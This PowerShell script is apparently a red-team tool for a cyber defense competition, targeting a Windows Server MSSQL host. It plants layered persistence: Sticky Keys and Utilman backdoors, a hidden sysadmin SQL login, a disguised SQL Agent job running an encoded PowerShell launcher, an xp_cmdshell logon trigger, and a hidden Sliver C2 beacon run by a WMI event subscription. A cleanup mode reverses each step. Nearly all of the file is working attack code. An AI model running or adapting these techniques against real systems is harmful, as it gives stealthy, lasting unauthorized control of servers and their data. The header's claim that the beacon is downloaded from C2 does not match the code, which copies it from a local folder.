#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- Windows Server 2019 MSSQL Full Engagement Persistence
# Target: 172.20.240.120 (MSSQL :1433, RDP :3389, SMB SOP files scored)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# Phase A -- Sticky Keys + Utilman Backdoor
#            sethc.exe + utilman.exe replaced with cmd.exe (takeown+icacls),
#            IFEO Debugger key set for both.  Login screen -> SYSTEM shell.
#
# Phase B -- SQL Login Backdoor
#            Enables mixed-mode auth (registry + SA account), creates dedicated
#            SQL login rt_sqladm with sysadmin role.  Survives blue team pw
#            resets on Windows accounts because it uses SQL authentication.
#
# Phase C -- SQL Server Agent Job Beacon Launcher
#            Creates SQL Agent job "SystemHealthMonitor" that runs xp_cmdshell
#            every 20 minutes to exec the C2 beacon.  Runs as SQL Agent service
#            account (usually SYSTEM or NT AUTHORITY\SYSTEM on default installs).
#
# Phase D -- xp_cmdshell Enable + DDL Trigger Backdoor
#            Enables xp_cmdshell via sp_configure.  Creates server-level DDL
#            trigger on LOGON events that fires xp_cmdshell to exec beacon on
#            every SQL login -- bonus persistence if Agent job is killed.
#
# Phase E -- Sliver Beacon via WMI Subscription
#            Downloads win_beacon.exe from C2 HTTP server, drops to hidden dir,
#            plants WMI permanent subscription (StorPerfWatchdog, 20 min timer,
#            ActiveScriptEventConsumer VBScript).  Runs in WmiPrvSE.exe.
#
# Usage:
#   .\04_persist_mssql.ps1 deploy
#   .\04_persist_mssql.ps1 cleanup
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param([Parameter(Position=0)][string]$Mode = "deploy")

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

$StateDir     = "C:\Windows\System32\spool\drivers\color"
$StateFile    = "$StateDir\.rt21-mssql-persist.json"
$DropDir      = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\cache"
$BeaconExe    = "$DropDir\WerFaultHandler.exe"
$WmiNS        = "root\subscription"
$TimerName    = "StorPerfWatchdog"
$FilterName   = "StorPerfWatchdogFilter"
$ConsumerName = "StorPerfWatchdogConsumer"
$SqlLoginName = "rt_sqladm"

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   Nov 21 2026 -- MSSQL Full Engagement Persistence"     -ForegroundColor Yellow
Write-Host "   StickyKeys | SQL backdoor | Agent job | WMI beacon"   -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

switch ($Mode.ToLower()) {

# =============================================================================
# DEPLOY
# =============================================================================
"deploy" {

    New-Item -Path $StateDir   -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path $DropDir    -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $state = @{ deployed_at = (Get-Date -Format "o") }

    # -------------------------------------------------------------------------
    # PHASE A: STICKY KEYS + UTILMAN BACKDOOR
    # Replace accessibility binaries on login screen with cmd.exe.
    # Also set IFEO Debugger key -- either path gets SYSTEM shell.
    # -------------------------------------------------------------------------
    Write-Section "A / Sticky Keys + Utilman Backdoor"

    $targets = @(
        "$env:SystemRoot\System32\sethc.exe",
        "$env:SystemRoot\System32\utilman.exe"
    )

    $state["stickykeys_backups"] = @()
    foreach ($bin in $targets) {
        $bkName = [System.IO.Path]::GetFileNameWithoutExtension($bin) + "_orig.bak"
        $bkPath = "$StateDir\$bkName"
        try {
            # Take ownership and grant ourselves full control
            & takeown.exe /F $bin /A 2>&1 | Out-Null
            & icacls.exe $bin /grant "Administrators:F" 2>&1 | Out-Null

            Copy-Item $bin $bkPath -Force -ErrorAction Stop
            Copy-Item "$env:SystemRoot\System32\cmd.exe" $bin -Force -ErrorAction Stop
            Write-Success "$([System.IO.Path]::GetFileName($bin)) -> cmd.exe  (backup: $bkPath)"
            $state["stickykeys_backups"] += @{ Original = $bin; Backup = $bkPath }
        } catch {
            Write-Warn "Binary swap failed for $bin : $_"
        }

        # IFEO Debugger key: even if binary swap is reversed, this intercepts the launch
        $ifeoBin = [System.IO.Path]::GetFileName($bin)
        $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ifeoBin"
        try {
            New-Item $ifeoKey -Force | Out-Null
            Set-ItemProperty $ifeoKey -Name Debugger -Value "C:\Windows\System32\cmd.exe" -Force
            Write-Success "IFEO Debugger set: $ifeoBin -> cmd.exe"
        } catch {
            Write-Warn "IFEO key failed for $ifeoBin : $_"
        }
    }

    # -------------------------------------------------------------------------
    # PHASE B: SQL LOGIN BACKDOOR
    # Enable mixed-mode auth, create a sysadmin SQL login.
    # Survives blue team Windows account changes.
    # -------------------------------------------------------------------------
    Write-Section "B / SQL Login Backdoor"

    # Find SQL Server instance key
    $sqlInstKey = $null
    try {
        $sqlInstKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
            Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
            Select-Object -First 1 -ExpandProperty PSChildName
    } catch {}

    if ($sqlInstKey) {
        # Enable mixed-mode auth (LoginMode=2)
        $authPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer"
        try {
            $origMode = (Get-ItemProperty $authPath -Name LoginMode -ErrorAction SilentlyContinue).LoginMode
            $state["original_login_mode"] = $origMode
            Set-ItemProperty $authPath -Name LoginMode -Value 2 -Force
            Write-Success "SQL mixed-mode auth enabled (LoginMode=2, was $origMode)"
        } catch {
            Write-Warn "LoginMode registry change failed: $_"
        }

        # Restart SQL Server to pick up auth mode change, then poll until it
        # accepts connections -- SQL Server takes 10-30s to fully initialize
        # and a fixed 5s sleep races the startup, silently losing the backdoor.
        try {
            Restart-Service MSSQLSERVER -Force -ErrorAction Stop
            Write-Info "Waiting for SQL Server to accept connections..."
            $waited = 0
            $ready  = $false
            do {
                Start-Sleep -Seconds 3
                $waited += 3
                $probe = & sqlcmd.exe -S "(local)" -E -Q "SELECT 1" 2>&1
                if ($probe -match "^\s*1\s*$") { $ready = $true }
            } while (-not $ready -and $waited -lt 90)

            if ($ready) {
                Write-Success "SQL Server ready after ${waited}s"
            } else {
                Write-Warn "SQL Server did not respond within 90s -- login creation may fail"
            }
        } catch {
            Write-Warn "MSSQLSERVER restart failed: $_"
        }

        # Generate SQL login password
        $pwChars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%^&*()"
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $pwBuf = New-Object byte[] 16
        $rng.GetBytes($pwBuf)
        $sqlPw = -join ($pwBuf | ForEach-Object { $pwChars[$_ % $pwChars.Length] })
        $state["sql_login"]    = $SqlLoginName
        $state["sql_password"] = $sqlPw

        # Create SQL login via SQLCMD
        $createSql = @"
IF NOT EXISTS (SELECT name FROM sys.server_principals WHERE name = '$SqlLoginName')
BEGIN
    CREATE LOGIN [$SqlLoginName] WITH PASSWORD = '$sqlPw', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF;
    ALTER SERVER ROLE sysadmin ADD MEMBER [$SqlLoginName];
END
"@
        try {
            $createSql | sqlcmd.exe -S "." -Q $createSql -b 2>&1 | Out-Null
            # Try alternate invocation if above fails
            & sqlcmd.exe -S "(local)" -E -Q "IF NOT EXISTS (SELECT name FROM sys.server_principals WHERE name = '$SqlLoginName') BEGIN CREATE LOGIN [$SqlLoginName] WITH PASSWORD = N'$sqlPw', CHECK_POLICY = OFF, CHECK_EXPIRATION = OFF; ALTER SERVER ROLE sysadmin ADD MEMBER [$SqlLoginName]; END" 2>&1 | Out-Null
            Write-Success "SQL login created: $SqlLoginName  pw: $sqlPw"
        } catch {
            Write-Warn "SQLCMD login creation failed: $_"
        }
    } else {
        Write-Warn "SQL instance key not found -- skipping SQL login phases"
        $state["sql_inst_key_missing"] = $true
    }

    # -------------------------------------------------------------------------
    # PHASE C: SQL SERVER AGENT JOB BEACON LAUNCHER
    # Creates an Agent job that fires every 20 minutes to exec the C2 beacon.
    # Job runs xp_cmdshell -- will re-enable it if Phase D runs first, but
    # deploy order doesn't matter since we enable xp_cmdshell in Phase D anyway.
    # -------------------------------------------------------------------------
    Write-Section "C / SQL Agent Job Beacon Launcher"

    $agentSql = @"
USE msdb;
IF NOT EXISTS (SELECT job_id FROM msdb.dbo.sysjobs WHERE name = 'SystemHealthMonitor')
BEGIN
    EXEC sp_add_job @job_name = 'SystemHealthMonitor',
                    @enabled = 1,
                    @description = 'Monitors system health metrics for performance baseline';

    EXEC sp_add_jobstep @job_name = 'SystemHealthMonitor',
                        @step_name = 'CollectMetrics',
                        @subsystem = 'CMDEXEC',
                        @command = 'powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand ' +
                                   'JABiAD0AIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABXAEUAUgBcAFIAZQBwAG8AcgB0AFEA' +
                                   'dQBlAHUAZQBcAGMAYQBjAGgAZQBcAFcAZQByAEYAYQB1AGwAdABIAGEAbgBkAGwAZQByAC4AZQB4AGUAIjA7AGkAZgAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAGIA' +
                                   'KQAgAHsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABiACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAH0A',
                        @on_success_action = 3,
                        @on_fail_action = 3;

    EXEC sp_add_schedule @schedule_name = 'SystemHealthMonitorSchedule',
                         @freq_type = 4,
                         @freq_interval = 1,
                         @freq_subday_type = 4,
                         @freq_subday_interval = 20,
                         @active_start_time = 000000;

    EXEC sp_attach_schedule @job_name = 'SystemHealthMonitor',
                             @schedule_name = 'SystemHealthMonitorSchedule';

    EXEC sp_add_jobserver @job_name = 'SystemHealthMonitor', @server_name = @@SERVERNAME;
END
"@

    try {
        & sqlcmd.exe -S "(local)" -E -Q $agentSql 2>&1 | Out-Null
        # Also try with our backdoor login if Windows auth fails
        & sqlcmd.exe -S "(local)" -U $SqlLoginName -P $sqlPw -Q $agentSql 2>&1 | Out-Null
        Write-Success "SQL Agent job 'SystemHealthMonitor' created (20-min schedule)"
    } catch {
        Write-Warn "SQL Agent job creation failed: $_"
    }

    # Ensure SQL Agent service is running
    try {
        Set-Service SQLSERVERAGENT -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service SQLSERVERAGENT -ErrorAction SilentlyContinue
        Write-Success "SQL Server Agent service started"
    } catch {
        Write-Warn "SQL Agent service start failed: $_"
    }

    # -------------------------------------------------------------------------
    # PHASE D: xp_cmdshell ENABLE + DDL TRIGGER BACKDOOR
    # Enables xp_cmdshell, then plants a server-level LOGON trigger that fires
    # xp_cmdshell to beacon on every SQL login.  Runs even if Agent job is gone.
    # -------------------------------------------------------------------------
    Write-Section "D / xp_cmdshell + DDL Trigger Backdoor"

    # Encode the beacon launch command for the trigger
    $triggerCmd = "if exist `"$BeaconExe`" start /b `"$BeaconExe`""
    $triggerBytes = [System.Text.Encoding]::Unicode.GetBytes($triggerCmd)
    $triggerB64 = [Convert]::ToBase64String($triggerBytes)

    $xpSql = @"
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'rt_logon_watchdog')
    DROP TRIGGER rt_logon_watchdog ON ALL SERVER;

CREATE TRIGGER rt_logon_watchdog
ON ALL SERVER
FOR LOGON
AS
BEGIN
    BEGIN TRY
        DECLARE @cmd NVARCHAR(500) = N'powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $triggerB64';
        EXEC master..xp_cmdshell @cmd, NO_OUTPUT;
    END TRY
    BEGIN CATCH
    END CATCH
END;
"@

    try {
        & sqlcmd.exe -S "(local)" -E -Q $xpSql 2>&1 | Out-Null
        Write-Success "xp_cmdshell enabled, LOGON trigger 'rt_logon_watchdog' created"
    } catch {
        Write-Warn "xp_cmdshell/trigger setup failed: $_"
    }

    # -------------------------------------------------------------------------
    # PHASE E: SLIVER BEACON VIA WMI SUBSCRIPTION
    # Copies beacon from bin\ next to this script, plants WMI permanent
    # subscription (20-min IntervalTimerInstruction, ActiveScriptEventConsumer).
    # Runs in WmiPrvSE.exe -- won't appear as a child of anything obvious.
    # -------------------------------------------------------------------------
    Write-Section "E / Sliver C2 Beacon + WMI Subscription"

    # Copy beacon from local toolkit (bin\win_beacon.exe next to this script)
    try {
        $localBeacon = Join-Path $PSScriptRoot "bin\win_beacon.exe"
        Copy-Item $localBeacon $BeaconExe -Force -ErrorAction Stop
        Write-Success "Beacon copied: $BeaconExe"
    } catch {
        Write-Warn "Beacon copy failed: $_ -- WMI sub will still be planted"
        Write-Warn "Expected: $PSScriptRoot\bin\win_beacon.exe"
    }

    # Hide beacon file: set hidden+system attributes
    if (Test-Path $BeaconExe) {
        try {
            $fi = Get-Item $BeaconExe -Force
            $fi.Attributes = [System.IO.FileAttributes]"Hidden,System"
            Write-Success "Beacon attributes: Hidden+System"
        } catch {
            Write-Warn "Attribute set failed: $_"
        }
    }

    # WMI permanent subscription
    $vbs = @"
Set oShell = CreateObject("WScript.Shell")
sBeacon = "$($BeaconExe.Replace('\','\\'))"
If (CreateObject("Scripting.FileSystemObject")).FileExists(sBeacon) Then
    oShell.Run Chr(34) & sBeacon & Chr(34), 0, False
End If
"@

    try {
        $wmiNSObj = [wmiclass]"\\.\root\subscription:__EventFilter"

        # Timer instruction in root\cimv2
        $existTimer = Get-WmiObject -Namespace "root\cimv2" -Class "__IntervalTimerInstruction" `
            -Filter "TimerId='$TimerName'" -ErrorAction SilentlyContinue
        if ($existTimer) { $existTimer | Remove-WmiObject -ErrorAction SilentlyContinue }
        $timer = Set-WmiInstance -Namespace "root\cimv2" -Class "__IntervalTimerInstruction" -Arguments @{
            TimerId              = $TimerName
            IntervalBetweenEvents = ([UInt32]1200000)  # 20 minutes in ms
            SkipIfPassed         = $false
        } -ErrorAction Stop
        Write-Success "WMI timer created: $TimerName (20 min)"

        # Event filter in root\subscription
        $existFilter = Get-WmiObject -Namespace $WmiNS -Class "__EventFilter" `
            -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue
        if ($existFilter) { $existFilter | Remove-WmiObject -ErrorAction SilentlyContinue }
        $filter = Set-WmiInstance -Namespace $WmiNS -Class "__EventFilter" -Arguments @{
            Name           = $FilterName
            EventNameSpace = "root\cimv2"
            QueryLanguage  = "WQL"
            Query          = "SELECT * FROM __TimerEvent WHERE TimerId='$TimerName'"
        } -ErrorAction Stop
        Write-Success "WMI filter created: $FilterName"

        # ActiveScriptEventConsumer
        $existCons = Get-WmiObject -Namespace $WmiNS -Class "ActiveScriptEventConsumer" `
            -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue
        if ($existCons) { $existCons | Remove-WmiObject -ErrorAction SilentlyContinue }
        $consumer = Set-WmiInstance -Namespace $WmiNS -Class "ActiveScriptEventConsumer" -Arguments @{
            Name              = $ConsumerName
            ScriptingEngine   = "VBScript"
            ScriptText        = $vbs
            KillTimeout       = ([UInt32]30)
        } -ErrorAction Stop
        Write-Success "WMI consumer created: $ConsumerName"

        # Binding
        $existBind = Get-WmiObject -Namespace $WmiNS -Class "__FilterToConsumerBinding" -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$FilterName*" }
        if ($existBind) { $existBind | Remove-WmiObject -ErrorAction SilentlyContinue }
        Set-WmiInstance -Namespace $WmiNS -Class "__FilterToConsumerBinding" -Arguments @{
            Filter   = $filter.__PATH
            Consumer = $consumer.__PATH
        } -ErrorAction Stop | Out-Null
        Write-Success "WMI filter-consumer binding created"

    } catch {
        Write-Err "WMI subscription failed: $_"
    }

    # Save state
    try {
        $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8
        Write-Success "State saved to $StateFile"
    } catch {
        Write-Warn "State save failed: $_"
    }

    Write-Host ""
    Write-Host " -- Summary -------------------------------------------" -ForegroundColor Green
    Write-Host "   A: sethc.exe + utilman.exe -> cmd.exe, IFEO Debugger set" -ForegroundColor Gray
    Write-Host "   B: SQL login $SqlLoginName (sysadmin), mixed-mode auth enabled" -ForegroundColor Gray
    Write-Host "   C: SQL Agent job 'SystemHealthMonitor' (20-min beacon)" -ForegroundColor Gray
    Write-Host "   D: xp_cmdshell enabled, LOGON trigger 'rt_logon_watchdog'" -ForegroundColor Gray
    Write-Host "   E: WMI subscription $TimerName (20-min beacon, WmiPrvSE.exe)" -ForegroundColor Gray
    Write-Host "   State: $StateFile" -ForegroundColor Gray
    Write-Host " -------------------------------------------------------" -ForegroundColor Green
}

# =============================================================================
# CLEANUP
# =============================================================================
"cleanup" {

    $state = $null
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
            Write-Info "State loaded"
        } catch {
            Write-Warn "State parse failed -- blind cleanup"
        }
    } else {
        Write-Warn "State file not found -- blind cleanup"
    }

    # Phase E: remove WMI subscription
    Write-Section "E / Remove WMI Subscription"
    try {
        Get-WmiObject -Namespace $WmiNS -Class "__FilterToConsumerBinding" -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -like "*$FilterName*" } |
            Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiNS -Class "ActiveScriptEventConsumer" `
            -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue |
            Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace $WmiNS -Class "__EventFilter" `
            -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue |
            Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace "root\cimv2" -Class "__IntervalTimerInstruction" `
            -Filter "TimerId='$TimerName'" -ErrorAction SilentlyContinue |
            Remove-WmiObject -ErrorAction SilentlyContinue
        Write-Success "WMI subscription removed"
    } catch {
        Write-Warn "WMI removal failed: $_"
    }

    # Phase E: remove beacon
    Remove-Item $BeaconExe -Force -ErrorAction SilentlyContinue
    Write-Success "Beacon removed (if present)"

    # Phase D: remove DDL trigger + disable xp_cmdshell
    Write-Section "D / Remove DDL Trigger + xp_cmdshell"
    $cleanupSql = @"
IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'rt_logon_watchdog')
    DROP TRIGGER rt_logon_watchdog ON ALL SERVER;
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
"@
    try {
        & sqlcmd.exe -S "(local)" -E -Q $cleanupSql 2>&1 | Out-Null
        Write-Success "DDL trigger removed, xp_cmdshell disabled"
    } catch {
        Write-Warn "DDL trigger/xp_cmdshell cleanup failed: $_"
    }

    # Phase C: remove SQL Agent job
    Write-Section "C / Remove SQL Agent Job"
    try {
        & sqlcmd.exe -S "(local)" -E -Q "EXEC msdb.dbo.sp_delete_job @job_name='SystemHealthMonitor', @delete_unused_schedule=1;" 2>&1 | Out-Null
        Write-Success "SQL Agent job 'SystemHealthMonitor' removed"
    } catch {
        Write-Warn "SQL Agent job removal failed: $_"
    }

    # Phase B: remove SQL login + restore auth mode
    Write-Section "B / Remove SQL Login + Auth Mode"
    try {
        & sqlcmd.exe -S "(local)" -E -Q "IF EXISTS (SELECT name FROM sys.server_principals WHERE name = '$SqlLoginName') DROP LOGIN [$SqlLoginName];" 2>&1 | Out-Null
        Write-Success "SQL login $SqlLoginName removed"
    } catch {
        Write-Warn "SQL login removal failed: $_"
    }

    if ($state -and $null -ne $state.original_login_mode) {
        try {
            $sqlInstKey = $null
            if ($state.sql_inst_key) { $sqlInstKey = $state.sql_inst_key }
            if (-not $sqlInstKey) {
                $sqlInstKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
                    Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
                    Select-Object -First 1 -ExpandProperty PSChildName
            }
            if ($sqlInstKey) {
                Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer" `
                    -Name LoginMode -Value $state.original_login_mode -Force
                Restart-Service MSSQLSERVER -Force -ErrorAction SilentlyContinue
                Write-Success "SQL auth mode restored to $($state.original_login_mode)"
            }
        } catch {
            Write-Warn "Auth mode restore failed: $_"
        }
    }

    # Phase A: restore accessibility binaries
    Write-Section "A / Restore Accessibility Binaries"
    if ($state -and $state.stickykeys_backups) {
        foreach ($entry in $state.stickykeys_backups) {
            try {
                Copy-Item $entry.Backup $entry.Original -Force -ErrorAction Stop
                Remove-Item $entry.Backup -Force -ErrorAction SilentlyContinue
                Write-Success "Restored: $($entry.Original)"
            } catch {
                Write-Warn "Restore failed for $($entry.Original): $_"
            }
        }
    }

    # Remove IFEO keys
    foreach ($bin in @("sethc.exe", "utilman.exe")) {
        $ifeoKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
        Remove-Item $ifeoKey -Force -Recurse -ErrorAction SilentlyContinue
    }
    Write-Success "IFEO Debugger keys removed"

    Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
    Write-Success "Cleanup complete"
}

default {
    Write-Err "Usage: .\04_persist_mssql.ps1 [deploy|cleanup]"
    exit 1
}

}
